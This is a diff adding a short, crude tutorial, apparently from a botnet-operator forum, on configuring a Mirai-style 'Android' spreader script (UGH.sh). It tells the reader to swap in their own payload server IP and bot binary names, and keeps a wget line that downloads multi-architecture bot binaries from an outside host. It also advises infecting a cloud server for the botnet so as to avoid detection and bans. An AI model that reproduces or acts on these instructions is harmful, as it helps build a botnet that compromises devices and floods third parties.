@@ -1,0 +1,47 @@
+Android Tutorial by Wolvz#8331
+
+--------------
+Androiding roots -  Infecting a server to a botnet without it being detected. For example, you can infect a digital ocean server (ONLY 1 BC YOU WILL SEND TOO MANY PACKETS!!!!)  and they won't ban you.
+
+
+
+--------------
+This tutorial is really complicated!!!!!!!!!!!!!!!!!
+NOT REALLY, LMFAO
+
+
+--------------
+Change UGH.sh
+
+---
+Change WEBSERVER="185.244.25.72:80" to WEBSERVER="IP:80"
+
+---
+Change
+BINARIES="pandora.x86 pandora.mips pandora.mpsl pandora.arm pandora.arm5 pandora.arm6 pandora.arm7 pandora.ppc pandora.m68k pandora.sh4"
+
+
+
+to BINARIES="YourBinNames.x86 YourBinNames.mips YourBinNames.mpsl YourBinNames.arm YourBinNames.arm5 YourBinNames.arm6 YourBinNames.arm7 YourBinNames.ppc YourBinNames.m68k YourBinNames.sh4"
+
+---
+Change 	wget http://$WEBSERVER/Pandoras_Box/$Binary -O adb
+
+to 	wget http://$WEBSERVER/YOUR FILE DIRECTORY TO YOUR BINS/$Binary -O adb
+
+If you don't have a folder to your bins, just remove Pandoras_Box/
+
+
+---------------
+Example-
+https://gyazo.com/e4392c3e1b6dbab272a7556b2016f29c
+
+I had Pandoras_Box to my bins
+
+https://gyazo.com/43b5373549b1a4679cac47fe0b47f5a3?token=ee7a3f986f00f04f83dbfde2d093c89d
+
+
+
+
+
+
